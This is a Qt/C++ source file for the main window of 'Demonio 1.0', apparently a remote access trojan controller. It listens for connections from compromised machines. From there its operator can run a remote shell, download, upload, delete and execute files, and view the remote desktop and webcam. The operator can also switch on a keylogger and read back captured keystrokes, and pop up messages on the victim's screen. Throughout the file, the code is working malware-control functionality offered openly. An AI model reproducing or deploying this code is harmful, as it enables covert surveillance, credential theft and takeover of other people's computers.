/*
 *  Copyright (C) 2010 Alberto Pajuelo Montes <paju1986@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor,
 *  Boston, MA 02110-1301, USA.
 */

#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow ( QWidget *parent ) :
    QMainWindow ( parent ),
    ui ( new Ui::MainWindow )
{
  ui->setupUi ( this );
  conexiones = 0;
  activo = 0;
  ventana.activo = 0;
  esconderFrames();
  ui->frameConexion->show();
  QIcon icono;
  icono.addFile("./icons/demonio.png");
  this->setWindowIcon(icono);
  icono.addFile("./icons/modem.png");
  ui->listaOpciones->item(0)->setIcon(icono);
  icono.addFile("./icons/document-preview.png");
  ui->listaOpciones->item(1)->setIcon(icono);
  icono.addFile("./icons/shell.png");
  ui->listaOpciones->item(2)->setIcon(icono);
  icono.addFile("./icons/drive-harddisk.png");
  ui->listaOpciones->item(3)->setIcon(icono);
  icono.addFile("./icons/user-desktop.png");
  ui->listaOpciones->item(4)->setIcon(icono);
  icono.addFile("./icons/camera-web.png");
  ui->listaOpciones->item(5)->setIcon(icono);
  icono.addFile("./icons/input-keyboard.png");
  ui->listaOpciones->item(6)->setIcon(icono);
  icono.addFile("./icons/emblem-important.png");
  ui->listaOpciones->item(7)->setIcon(icono);
  icono.addFile("./icons/face-smile-big.png");
  ui->listaOpciones->item(8)->setIcon(icono);
  icono.addFile("./icons/im-user.png");
  ui->listaOpciones->item(9)->setIcon(icono);
  /*ui->listaOpciones->item(8)->icon();
  ui->listaOpciones->item(9)->icon();
  ui->listaOpciones->item()->icon();*/

  layoutPrincipal = new QGridLayout ( ui->centralWidget );
  layoutPrincipal->addWidget ( ui->listaOpciones );
  layoutPrincipal->addWidget ( ui->frameConexion,0,1 );
  layoutPrincipal->addWidget ( ui->frameInformacion,0,1 );
  layoutPrincipal->addWidget ( ui->frameArchivos,0,1 );
  layoutPrincipal->addWidget ( ui->frameLicencia,0,1 );
  layoutPrincipal->addWidget ( ui->frameShellRemota,0,1 );
  layoutPrincipal->addWidget ( ui->frameMensajes,0,1 );
  layoutPrincipal->addWidget ( ui->frameEscritorio,0,1 );
  layoutPrincipal->addWidget ( ui->frameWebcam,0,1);
  layoutPrincipal->addWidget ( ui->frameChat,0,1 );
  layoutPrincipal->addWidget ( ui->frameKeylogger,0,1 );
  layoutPrincipal->addWidget ( ui->notificacionLabel,1,0,1,-11);
  layoutPrincipal->setColumnStretch ( 1,300 );
  layoutPrincipal->setColumnStretch ( 0,100 );
  ui->gridLayout->setColumnStretch ( 0,1 );
  ui->gridLayout->setColumnStretch ( 2,900 );
  //ui->layoutPrincipal->addWidget(ui->frameLista,0,0);
  connect ( ui->servidoresLista,SIGNAL ( itemClicked ( QListWidgetItem* ) ),this,SLOT ( seleccionarServidor() ) );
  connect ( ui->botonEscuchar,SIGNAL ( clicked() ),this,SLOT ( escuchar() ) );
  connect ( ui->botonCerrarServidor,SIGNAL ( clicked() ),this,SLOT ( cerrarServidor() ) );
  connect ( ui->botonPing,SIGNAL ( clicked() ),this,SLOT ( ping() ) );
  connect ( ui->botonArchivos,SIGNAL ( clicked() ),this,SLOT ( abrirVentanaArchivos() ) );
  connect ( ui->botonWebcam,SIGNAL(clicked()),this,SLOT(abrirVentanaWebcam()));
  connect ( ui->botonReiniciar,SIGNAL ( clicked() ),this,SLOT ( reinciar() ) );
  connect ( ui->botonMostrar,SIGNAL ( clicked() ),this,SLOT ( enviarMensaje() ) );
  connect ( ventana.directoriosLista(),SIGNAL ( itemClicked ( QListWidgetItem* ) ),this,SLOT ( directorioCambio() ) );
  connect ( ventana.botonIr(),SIGNAL ( clicked() ),this,SLOT ( archivosIr() ) );
  connect ( ventana.rutaTexto(),SIGNAL ( returnPressed() ),this,SLOT ( archivosIr() ) );
  connect ( ventana.botonAtras(),SIGNAL ( clicked() ),this,SLOT ( archivosAtras() ) );
  connect ( ventana.botonHome(),SIGNAL ( clicked() ),this,SLOT ( archivosHome() ) );
  connect ( ventana.botonRefresco(),SIGNAL ( clicked() ),this,SLOT ( archivosRefresco() ) );
  connect ( ventana.botonDescargar(),SIGNAL ( clicked() ),this,SLOT ( archivosDescargar() ) );
  connect ( ventana.botonSubir(),SIGNAL ( clicked() ),this,SLOT ( archivosSubir() ) );
  connect ( ventana.botonBorrar(),SIGNAL ( clicked() ),this,SLOT ( archivosBorrar() ) );
  connect ( ventana.botonCarpeta(),SIGNAL ( clicked() ),this,SLOT ( archivosCarpeta() ) );
  connect ( ventana.botonEjecutar(),SIGNAL(clicked()),this,SLOT(archivosEjecutar()));
  connect ( ventana.botonCopiar(),SIGNAL(clicked()),this,SLOT(archivosCopiar()));
  connect ( ventana.botonMover(),SIGNAL(clicked()),this,SLOT(archivosMover()));
  connect ( ventana.comboUnidad(),SIGNAL(currentIndexChanged(QString)),this,SLOT(cambioComboUnidad()));
  connect ( ui->botonEscritorio,SIGNAL ( clicked() ),this,SLOT ( abrirVentanaEscritorio() ) );
  connect ( ui->actionOpciones,SIGNAL(triggered()),this,SLOT(opcionesServidor()));
  connect ( ui->actionAcerca_de_Qt,SIGNAL(triggered()),this,SLOT(showAboutQt()));
  connect ( ui->actionAcerca_de,SIGNAL(triggered()),this,SLOT(about()));
  connect ( ui->actionLicencia,SIGNAL(triggered()),this,SLOT(licencia()));
  connect ( ui->actionSalir,SIGNAL(triggered()),this,SLOT(close()));
  connect ( ui->actionConfigurar_puertos,SIGNAL(triggered()),this,SLOT(opcionesVentanaPuertos()));
  connect ( ui->botonChatEnviar,SIGNAL(clicked()),this,SLOT(enviarMensajeChat()));
  connect ( ui->botonAbrirChat,SIGNAL(clicked()),this,SLOT(abrirChat()));
  connect ( ui->botonCerrarChat,SIGNAL(clicked()),this,SLOT(cerrarChat()));
  connect ( opcionesPuertos.botonPonerPuertos(),SIGNAL(clicked()),this,SLOT(ponerPuertos()) );
  connect (ui->botonActivarKeylogger,SIGNAL(clicked()),this,SLOT(activarKey()));
  connect (ui->botonDesactivarKeylogger,SIGNAL(clicked()),this,SLOT(desactivarKey()));
  connect (ui->botonRecibirTeclas,SIGNAL(clicked()),this,SLOT(recibirKey()));
  connect (ui->botonLimpiarLog,SIGNAL(clicked()),this,SLOT(limpiarKey()));
  connect (ui->botonInformacion,SIGNAL(clicked()),this,SLOT(pedirInformacion()));
}

MainWindow::~MainWindow()
{
  server.close();
  delete ui;
}
void MainWindow::changeEvent ( QEvent *e )
{
  QMainWindow::changeEvent ( e );
  switch ( e->type() )
    {
    case QEvent::LanguageChange:
      ui->retranslateUi ( this );
      break;
    default:
      break;
    }
}
bool MainWindow::event(QEvent *event)
{
    switch ( event->type() )
    {
    case QEvent::Close:
        QApplication::exit();
        break;
    default:
        this->QMainWindow::event(event);
    }
    return true;
}
void MainWindow::esconderFrames()
{
  ui->frameConexion->hide();
  ui->frameInformacion->hide();
  ui->frameShellRemota->hide();
  ui->frameArchivos->hide();
  ui->frameLicencia->hide();
  ui->frameMensajes->hide();
  ui->frameEscritorio->hide();
  ui->frameWebcam->hide();
  ui->frameChat->hide();
  ui->frameKeylogger->hide();
}
void MainWindow::listaOpciones()
{
  int opcion = ui->listaOpciones->currentIndex().row();
  esconderFrames();
  switch ( opcion )
    {
    case ( 0 ) :
    {
      ui->frameConexion->show();
      break;
    }
    case ( 1 ) :
    {
      ui->frameInformacion->show();
      break;
    }
    case ( 2 ) :
    {
      ui->frameShellRemota->show();
      break;
    }
    case ( 3 ) :
    {
      ui->frameArchivos->show();
      break;
    }
    case ( 4 ) :
    {
      ui->frameEscritorio->show();
      break;
    }
    case ( 5 ) :
    {
      ui->frameWebcam->show();
      break;
    }
    case ( 6 ) :
    {
      ui->frameKeylogger->show();
      break;
    }
    case ( 7 ) :
    {
      ui->frameMensajes->show();
      break;
    }
    case ( 8 ) :
    {
        break;
    }
    case ( 9 ) :
    {
        ui->frameChat->show();
        break;
    }
    default:
    {

    }
    }
}

void MainWindow::showAboutQt()
{
  QApplication::aboutQt();
}
void MainWindow::licencia()
{
  QFile licencia;
  licencia.setFileName ( "rc/gpl-3.0.txt" );
  licencia.open ( QIODevice::ReadOnly );
  ui->licenciaText->setText ( licencia.readAll() );
  licencia.close();
  esconderFrames();
  ui->frameLicencia->show();
}
void MainWindow::about()
{
  util.ventanaEmergente("Demonio 1.0 SVN<br>Programado por: Alberto Pajuelo Montes<br>Email: paju1986@gmail.com");
}
void MainWindow::opcionesServidor()
{
    opciones.show();
}
void MainWindow::opcionesVentanaPuertos()
{
    opcionesPuertos.show();
}
void MainWindow::escuchar()
{
  /**pone a escuchar un servidor en el puerto indicado **/
  port = 1234;
  portArchivos = 2345;
  portEscritorio = 3456;
  portWebcam = 4567;
  server.listen ( QHostAddress::Any,port );
  serverArchivos.listen ( QHostAddress::Any,portArchivos );
  serverEscritorio.listen ( QHostAddress::Any,portEscritorio );
  serverWebcam.listen ( QHostAddress::Any,portWebcam );
  connect ( &server,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexion() ) );
  connect ( &serverArchivos,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionArchivos() ) );
  connect ( &serverEscritorio,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionEscritorio() ) );
  connect ( &serverEscritorio,SIGNAL ( newConnection() ),this,SLOT ( nuevaConexionWebcam() ) );
  connect ( &mapa,SIGNAL ( mapped ( int ) ),this,SLOT ( desconectado ( int ) ) );
  if ( server.isListening() && serverArchivos.isListening() && serverEscritorio.isListening() && serverWebcam.isListening())
    {
      ui->notificacionLabel->setText ( "Escuchando" );
    }
}
void MainWindow::nuevaConexion()
{
  /** cuando una conexion entrante es escuchada por el servidor se la pasa a un socket libre del array de sockets **/
  socket[conexiones] = server.nextPendingConnection();
  connect ( socket[conexiones],SIGNAL ( readyRead() ),this,SLOT ( llegadaDatos() ) );
  connect ( socket[conexiones],SIGNAL ( disconnected() ),&mapa,SLOT ( map() ) );
  mapa.setMapping ( socket[conexiones],conexiones );
  socket[conexiones]->blockSignals ( true );
  ui->servidoresLista->addItem ( socket[conexiones]->localAddress().toString() ); //mostrar la IP en la lista de servidores
  conexiones++;
}
void MainWindow::nuevaConexionArchivos()
{
  ventana.socketArchivos[ventana.conexiones] = serverArchivos.nextPendingConnection();
  ventana.conexiones++;
}
void MainWindow::nuevaConexionEscritorio()
{
  escritorio.socketEscritorio[escritorio.conexiones] = serverEscritorio.nextPendingConnection();
  escritorio.conexiones++;
}

void MainWindow::nuevaConexionWebcam()
{
    webcam.socketWebcam[webcam.conexiones] = serverWebcam.nextPendingConnection();
    webcam.conexiones++;
}

void MainWindow::llegadaDatos() /** llegada de datos; **/
{
  QString datos = socket[activo]->readAll();
  QStringList parametros = datos.split ( "|@|" );
  if ( parametros[0] == "shell" )
    {
      ui->salidaTexto->setText ( parametros[1] );
    }
  if ( parametros[0] == "home" )
    {
      ventana.establecerRuta ( parametros[1] );
      util.escribirSocket ( "archivos|@|" + parametros[1],socket[activo] );
    }
  if (parametros[0] == "unidades")
  {
    ventana.comboUnidad()->clear();
    ponerUnidades(parametros);
  }
  if ( parametros[0] == "file" )
    {
      ponerArchivos ( parametros );
      util.escribirSocket ( "directorios|@|" + ventana.ruta,socket[activo] );
    }
  if ( parametros[0] == "folder" )
    {
      ponerDirectorios ( parametros );
    }
  if (parametros[0] == "chat") {
      this->ponerMensajeChat(parametros[1],ui->textoNickServidor->text());
  }
  if (parametros[0] == "resolucion")
  {
    escritorio.alto = parametros[1].toInt();
    escritorio.ancho = parametros[2].toInt();
  }
  if (parametros[0] == "teclas")
  {
    ui->textTeclas->setText(parametros[1]);
  }  
  if (parametros[0] == "informacion")
  {
    QString informacion;
    QString so = parametros[1];
    QString version = parametros[2];
    QString homePath = parametros[3];
    QString tempPath = parametros[4];
    escritorio.ancho = parametros[5].toInt();
    escritorio.alto = parametros[6].toInt();
    QString fecha = parametros[7];
    QString hora = parametros[8];
    this->alias = parametros[9];
    informacion = "Sistema operativo: " + so + "<br>";
    informacion = informacion + "Versi&oacute;n: " + version +"<br>";
    informacion = informacion + "Directorio del usuario: " + homePath + "<br>";
    informacion = informacion + "Directorio temporal: " + tempPath + "<br>";
    informacion = informacion + "Resoluci&oacute;n de pantalla: " + parametros[5] + "X" + parametros[6] + "<br>";
    informacion = informacion + "Fecha del sistema: " + fecha + "<br>";
    informacion = informacion + "Hora del sistema: " + hora + "<br>";
    ui->informacionSistemaTexto->setHtml(informacion);
    this->setWindowTitle("Demonio - Cliente - Conectado a: " + this->alias);
    util.escribirSocket("unidades|@|",socket[activo]);
  }
}
void MainWindow::seleccionarServidor()
{
  /** se utiliza el indice de la lista para salecionar un socket del array y desbloquearle las señales **/
  socket[activo]->blockSignals ( true );
  activo = ui->servidoresLista->currentIndex().row();
  ventana.activo = activo;
  escritorio.activo = activo;
  webcam.activo = activo;
  socket[activo]->blockSignals ( false );
  util.escribirSocket("informacion|@|",socket[activo]);
  ui->notificacionLabel->setText ( "IP: " + ui->servidoresLista->currentItem()->text() );
  if( ventana.socketArchivos[activo]->state() == QAbstractSocket::ConnectedState )
  {
    ui->notificacionLabel->setText(ui->notificacionLabel->text() + " socket de archivos conectado.");
  }
  if(escritorio.socketEscritorio[activo]->state() == QAbstractSocket::ConnectedState)
  {
    ui->notificacionLabel->setText(ui->notificacionLabel->text() + " socket de escritorio conectado.");
  }
  if(webcam.socketWebcam[activo]->state() == QAbstractSocket::ConnectedState)
  {
    ui->notificacionLabel->setText(ui->notificacionLabel->text() + " socket de webcam conectado.");
  }
}
void MainWindow::ping()
{
  /** hacer ping al host remoto **/
  util.escribirSocket ( "ping",socket[activo] );
}
void MainWindow::cerrarServidor()
{
  /** cierra el servdor **/
  util.escribirSocket ( "cerrar",socket[activo] );
}
void MainWindow::desconectado ( int indice )
{
  /** cuando un socket se desconecta se borra de la lista y se reorganiza el array **/
  int j;
  ui->servidoresLista->takeItem ( indice );
  socket[indice]->close();
  ventana.socketArchivos[indice]->close();
  escritorio.socketEscritorio[indice]->close();
  //socket[indice]->~QTcpSocket(); //Da fallo de segmentación al intentar liberar la memoria del socket
  for ( j=indice;conexiones - 1 > j;j++ )
    {
      socket[j] = socket[j + 1];
      ventana.socketArchivos[j] = ventana.socketArchivos[j + 1];
      escritorio.socketEscritorio[j] = escritorio.socketEscritorio[j + 1];
    }
  conexiones--;
  ventana.conexiones--;
  escritorio.conexiones--;
  webcam.conexiones--;
}
void MainWindow::shellEnviar()
{
  QString datos = "shell|@|" + ui->entradaTexto->text();
  util.escribirSocket ( datos,socket[activo] );
}
void MainWindow::reinciar()
{
  util.escribirSocket ( "reiniciar",socket[activo] );
}
void MainWindow::abrirVentanaArchivos()
{
  ventana.limpiarArchivos();
  ventana.show();
}
void MainWindow::abrirVentanaWebcam()
{
    this->webcam.show();
}
void MainWindow::cambioComboUnidad()
{
    ventana.limpiarArchivos();
    ventana.establecerRuta ( ventana.comboUnidad()->currentText() );
    util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
}
void MainWindow::ponerUnidades(QStringList unidades)
{
    int i;
    for ( i=1;i<unidades.size() -1;i++ )
      {
        ventana.ponerUnidad ( unidades[i] );
      }
}
void MainWindow::ponerArchivos ( QStringList archivos )
{
  int i;
  for ( i=1;i<archivos.size() -1;i++ )
    {
      ventana.ponerArchivo ( archivos[i] );
    }
}
void MainWindow::ponerDirectorios ( QStringList directorios )
{
  int i;
  for ( i=2;i<directorios.size() -1;i++ )
    {
      ventana.ponerDirectorio ( directorios[i] );
    }
}
void MainWindow::directorioCambio()
{
  QString nuevoDirectorio = ventana.directoriosLista()->currentItem()->text();
  if ( nuevoDirectorio == ".." )
    {
      ventana.rutaAnterior = util.obtenerRutaAnterior ( ventana.ruta );
      ventana.establecerRuta ( ventana.rutaAnterior );
      ventana.limpiarArchivos();
      util.escribirSocket ( "archivos|@|" + ventana.rutaAnterior,socket[activo] );
    }
  else
    {
      ventana.ruta = ventana.ruta + "/" + nuevoDirectorio;
      ventana.establecerRuta ( ventana.ruta );
      ventana.limpiarArchivos();
      util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
    }
}
void MainWindow::archivosIr()
{
  ventana.limpiarArchivos();
  ventana.establecerRuta ( ventana.rutaTexto()->text() );
  util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
}
void MainWindow::archivosAtras()
{
  ventana.rutaAnterior = util.obtenerRutaAnterior ( ventana.ruta );
  ventana.establecerRuta ( ventana.rutaAnterior );
  ventana.limpiarArchivos();
  util.escribirSocket ( "archivos|@|" + ventana.rutaAnterior,socket[activo] );
}
void MainWindow::archivosHome()
{
  ventana.limpiarArchivos();
  util.escribirSocket ( "home",socket[activo] );
}
void MainWindow::archivosRefresco()
{
  ventana.limpiarArchivos();
  util.escribirSocket ( "archivos|@|" + ventana.ruta,socket[activo] );
}
void MainWindow::archivosDescargar()
{
    if( ventana.archivosLista()->currentRow() >= 0) {
        QFileDialog dialogo;
        QString dir;
        dir = QDir::homePath() + "/" + ventana.archivosLista()->currentItem()->text();
        ventana.rutaArchivo = dialogo.getSaveFileName ( this,"Guardar archivo",dir );
        dialogo.show();
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
        util.escribirSocket ( "get|@|" + rutaArchivo,socket[activo] );
    }
}
void MainWindow::archivosSubir()
{
  QFileDialog archivo;
  QString nombreArchivo = archivo.getOpenFileName ( this,"Abrir archivo",QDir::homePath() );
  QStringList cachosArchivo = nombreArchivo.split ( "/" );
  util.escribirSocket ( "put|@|" + cachosArchivo[cachosArchivo.size() - 1],socket[activo] );
  ventana.subirArchivo ( nombreArchivo );
}

void MainWindow::archivosBorrar()
{   if( ventana.archivosLista()->currentRow() >= 0) {
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
        util.escribirSocket ( "remove|@|" + rutaArchivo,socket[activo] );
    }
}
void MainWindow::archivosCarpeta()
{
  QString nombre = QInputDialog::getText ( &ventana,"Nombre de la carpeta","Nombre de la carpeta" );
  util.escribirSocket ( "createfolder|@|" + nombre,socket[activo] );

}
void MainWindow::archivosEjecutar()
{
    if( ventana.archivosLista()->currentRow() >= 0) {
        QString rutaArchivo = ventana.ruta + "/" + ventana.archivosLista()->currentItem()->text();
        util.escribirSocket ( "execute|@|" + rutaArchivo,socket[activo] );
    }
}
void MainWindow::archivosCopiar()
{
    if(ventana.botonMover()->text() == "Pegar") //Para evitar interferencias con el boton mover
    {
        ventana.botonMover()->setText("Mover");
    }
    if(ventana.botonCopiar()->text() == "Copiar")
    {
        if( ventana.archivosLista()->currentRow() >= 0) {//Para evitar no tener un archivo selecionado
            copiaRuta = ventana.ruta + "/";
            copiaNombre = ventana.archivosLista()->currentItem()->text();
            ventana.botonCopiar()->setText("Pegar");
        }
    }
    else
    {
        ventana.botonCopiar()->setText("Copiar");
        util.escribirSocket("copiar|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre,socket[activo]);
    }
}
void MainWindow::archivosMover()
{
    if(ventana.botonCopiar()->text() == "Pegar") //Para evitar interferencias con el boton copiar
    {
        ventana.botonCopiar()->setText("Copiar");
    }
    if(ventana.botonMover()->text() == "Mover")
    {
        if( ventana.archivosLista()->currentRow() >= 0) { //Para evitar no tener un archivo selecionado
            copiaRuta = ventana.ruta + "/";
            copiaNombre = ventana.archivosLista()->currentItem()->text();
            ventana.botonMover()->setText("Pegar");
        }
    }
    else
    {
        ventana.botonMover()->setText("Mover");
        util.escribirSocket("mover|@|" + copiaRuta + copiaNombre + "|@|" + ventana.ruta + "/" + copiaNombre,socket[activo]);
    }
}
void MainWindow::enviarMensaje()
{
  QString mensaje;
  mensaje = ui->textoMensaje->document()->toPlainText() + "|@|" + ui->textoTitulo->text();
  if ( ui->radioAlerta->isChecked() )
    {
      util.escribirSocket ( "alerta|@|" + mensaje,socket[activo] );
    }
  if ( ui->radioInformacion->isChecked() )
    {
      util.escribirSocket ( "info|@|" + mensaje,socket[activo] );
    }
  if ( ui->radioPeligro->isChecked() )
    {
      util.escribirSocket ( "peligro|@|" + mensaje,socket[activo] );
    }

}

void MainWindow::abrirVentanaEscritorio()
{
  escritorio.show();
}

void MainWindow::abrirChat()
{
    util.escribirSocket("abrirchat",socket[activo]);
}

void MainWindow::cerrarChat()
{
    util.escribirSocket("cerrarchat",socket[activo]);
}

void MainWindow::enviarMensajeChat()
{
    this->ponerMensajeChat(ui->entradaChatTexto->text(),ui->textoNickCliente->text());
    util.escribirSocket ( "chat|@|" + ui->entradaChatTexto->text() + "|@|" + ui->textoNickCliente->text() + "|@|" + ui->textoNickServidor->text() ,socket[activo] );
    ui->entradaChatTexto->clear();
}
void MainWindow::ponerMensajeChat(QString mensajeChat, QString quien)
{
    ui->salidaChatTexto->document()->setHtml(ui->salidaChatTexto->document()->toHtml() + "<br>" + quien + " dice: " + mensajeChat);
}

void MainWindow::ponerPuertos()
{
    port = opcionesPuertos.puertoPrincipal()->text().toInt();
    portArchivos = opcionesPuertos.puertoArchivos()->text().toInt();
    portEscritorio = opcionesPuertos.puertoEscritorio()->text().toInt();
    portWebcam = opcionesPuertos.puertoWebcam()->text().toInt();
}

void MainWindow::activarKey()
{
    util.escribirSocket("activark|@|",socket[activo]);
}
void MainWindow::desactivarKey()
{
    util.escribirSocket("desactivark|@|",socket[activo]);
}
void MainWindow::recibirKey()
{
    util.escribirSocket("recibirk|@|",socket[activo]);
}
void MainWindow::limpiarKey()
{
    util.escribirSocket("limpiark|@|",socket[activo]);
}
void MainWindow::pedirInformacion()
{
    util.escribirSocket("informacion|@|",socket[activo]);
}
